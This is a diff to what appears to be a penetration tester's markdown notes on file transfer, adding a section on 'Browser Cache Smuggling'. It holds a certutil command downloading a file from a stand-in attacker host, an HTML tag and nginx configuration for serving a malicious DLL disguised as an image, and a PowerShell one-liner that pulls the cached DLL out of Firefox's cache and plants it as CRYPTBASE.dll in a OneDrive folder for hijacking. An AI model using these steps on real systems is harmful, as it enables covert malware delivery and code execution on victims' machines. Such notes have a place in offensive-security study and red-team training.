@@ -168,6 +168,43 @@ PS C:\Program Files (x86)\StorageService> net use \\192.168.119.209 /delete
 certutil -urlcache -split -f http://AttackerIP/file C:\path\to\out\file
 ```
 
+# Alternative and circumstantial situations
+
+## Browser Cache Smuggling
+
+Modern browsers (Firefox) implemented a mechanism that allow them storing static files locally on the computer in order not to reload them every time. This mechanism is called the browser cache, but it will not cache any files proposed by a server, but only static resources.
+
+Our goal is to force the download of either a DLL or an executable. To do so, we’ll simply have to change the content type related to the dll and exe files from: `application/x-msdos-program` to `image/jpg`. and serves it as an image: [^browser-cache-smug]
+
+```html
+<img src=evilDll.dll>
+```
+
+[^browser-cache-smug]: [Browser Cache Smuggling](../../Readwise/Articles/Aurélien%20Chalot%20-%20Browser%20Cache%20Smuggling.md)
+
+Because cached files are saved without extension and with a random name, we need to inject some custom metadata in order to find them easily. We can do it using custom Tags on our web server configuration:
+
+```
+server {
+	listen 80 default_server;
+	listen [::]:80 default_server;
+	root /var/www/html;
+	index index.html index.htm index.nginx-debian.html;
+	server_name _;
+
+	# Adding the header used to find the real DLL
+	location /evilDll.dll {
+		add_header Tag DLLHERE;
+	}
+}
+```
+
+We can find those tags using powershell: 
+
+```powershell
+foreach ($f in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")){Get-ChildItem $f -Recurse|%{if(Select-String -Pattern "DLLHERE" -Path $_.FullName){copy $_.FullName $env:LOCALAPPDATA\Microsoft\OneDrive\CRYPTBASE.dll}}}
+```
+
 ---
 
 # External References:
